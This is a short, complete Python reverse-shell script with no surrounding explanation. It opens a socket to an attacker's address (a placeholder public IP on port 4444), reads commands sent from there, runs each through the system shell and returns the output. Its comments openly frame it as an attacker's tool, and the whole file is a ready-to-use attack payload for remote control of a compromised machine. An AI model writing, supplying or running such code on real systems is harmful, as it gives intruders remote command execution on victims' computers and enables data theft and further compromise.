import socket
import subprocess

# Define the attacker's IP and port
attacker_ip = 'YOUR_PUBLIC_IP'  # Replace with your public IP
attacker_port = 4444

# Create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the attacker
client.connect((attacker_ip, attacker_port))

# Listen for commands
while True:
    command = client.recv(1024).decode()

    if command.lower() == 'exit':
        client.close()
        break

    # Execute the command
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Send the result back to the attacker
    client.send(result.stdout.encode() + result.stderr.encode())